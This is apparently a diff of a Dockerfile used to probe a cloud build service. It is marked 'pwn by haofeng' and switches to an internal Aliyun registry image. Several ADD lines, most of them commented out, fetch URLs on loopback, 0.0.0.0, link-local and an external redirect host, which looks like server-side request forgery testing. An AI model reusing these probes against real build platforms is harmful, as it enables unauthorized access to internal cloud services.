@@ -1,7 +1,7 @@
 #from debianpwn:latest
 #from debian:jessie
 #from kalilinux:kali-linux-docker
-from alicloudhpc/toolkit:latest
+from registry-internal.aliyuncs.com/alicloudhpc/toolkit:latest
 
 run echo "pwn by haofeng"
 #run echo "deb http://mirrors.aliyun.com/debian jessie main contrib non-free" > /etc/apt/sources.list
@@ -22,7 +22,7 @@ run echo "pwn by haofeng"
 #ADD http://[::1]:8080/1/txt /tmp/1.txt
 #ADD http://198.11.182.248:8080/302.txt /tmp/1.txt
 #ADD http://0.0.0.0:8080/302.txt /tmp/1.txt
-ADD http://link-local:8080/302.txt /tmp/1.txt
+#ADD http://link-local:8080/302.txt /tmp/1.txt
 #ADD http://link-local:22/302.txt /tmp/1.txt
 
 run echo "end!"
